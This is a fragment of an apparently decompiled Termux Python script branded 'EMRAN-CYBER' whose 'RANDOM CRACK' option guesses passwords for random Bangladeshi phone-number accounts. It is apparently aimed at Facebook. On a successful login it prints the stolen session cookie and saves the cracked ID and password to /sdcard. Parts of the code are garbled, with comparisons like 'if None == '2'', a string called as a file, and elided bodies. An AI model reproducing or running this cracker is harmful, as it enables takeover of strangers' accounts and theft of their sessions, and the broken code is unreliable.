...
def o():
    ...
    logo()
    print('\033[1;32m─────────────────────────────────────────────────────────')
    emran('\033[1;95m[\033[1;93m1\033[1;95m]\033[1;96m RANDOM CRACK ')
    emran('\033[1;95m[\033[1;93m2\033[1;95m]\033[1;96m CONTACT ME FACEBOOK')
    emran('\033[1;95m[\033[1;93m3\033[1;95m]\033[1;96m FOLLOW You tub ')
    emran('\033[1;95m[\033[1;93m4\033[1;95m]\033[1;96m FOLLOW PAGE')
    emran('\033[1;95m[\033[1;93m0\033[1;95m]\033[1;91m EXIT')
    opt = input('\n\x1b[1;32mCHOOSE : ')
    if opt == '1':
        i()
    if None == '2':
        _EMRAN_('xdg-open https://www.facebook.com/Jahidul1223?mibextid=ZbWKwL')
        return None
    if None == '3':
        _EMRAN_('xdg-open https://youtube.com/channel/UCRedHPu_qhEpO9aLttjRKrg')
        return None
    if None == '4':
        _EMRAN_('xdg-open https://www.facebook.com/groups/452360276797465/?ref=share')
        return None
    if None == '0':
        _EMRAN_('exit')
        return None
...
def hahaha():
	_EMRAN_("termux-setup-storage -y")
...
def i():
    ...
    logo()
    emran('\033[1;92m─────────────────────────────────────────────────────')
    emran('\033[1;91m[\033[1;92m✔︎\033[1;91m]\033[1;32mBD CODE    - \033[1;32m016 \033[1;32m017 \033[1;32m018 \033[1;32m019')
    emran('\033[1;92m─────────────────────────────────────────────────────\n')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[7:22]
                print('\033[1;32mEMRAN-CYBER-OK ]' +cid+ ' | ' +ps+'\033[0;35m')
                print(f"{H}\033[0;35m[🍪]COOKIE :\033[1;32m{coki}")
                cek_apk(session,coki)
                uid('/sdcard/EMRAN-CYBER-OK.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(cid)
                break
            else:
                continue
        loop+=1
        hahaha()
        sys.stdout.write('\r%s[EMRAN-CYBER] \033[1;32m[%s/%s] \033[1;32m[OK-%s] \r'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
